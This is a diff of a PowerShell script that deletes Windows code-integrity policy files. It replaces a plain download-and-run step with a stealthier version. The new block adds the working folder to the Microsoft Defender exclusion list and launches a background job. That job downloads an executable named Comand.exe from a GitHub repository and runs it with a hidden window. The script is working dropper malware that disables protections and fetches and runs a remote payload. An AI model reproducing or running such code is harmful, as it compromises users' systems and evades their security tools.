@@ -29,8 +29,15 @@ Remove-Item -LiteralPath "$env:windir\System32\CodeIntegrity\WiSiPolicy.p7b"
 Remove-Item -LiteralPath "$env:windir\Boot\EFI\wisipolicy.p7b"
 Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse
 
-# ============ DOWNLOAD + RUN EXE ============
-$url = "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe"
-$out = Join-Path $env:TEMP "Comand.exe"
-Invoke-WebRequest -Uri $url -OutFile $out
-Start-Process $out
+path = Get-Location
+$folder = $path.Path
+
+try {
+    Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
+} catch {}
+
+Start-Job -ScriptBlock {
+    param($f)
+    Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$f\Comand.exe" -ErrorAction SilentlyContinue
+    Start-Process -FilePath "$f\Comand.exe" -WindowStyle Hidden
+} -ArgumentList $folder | Out-Null
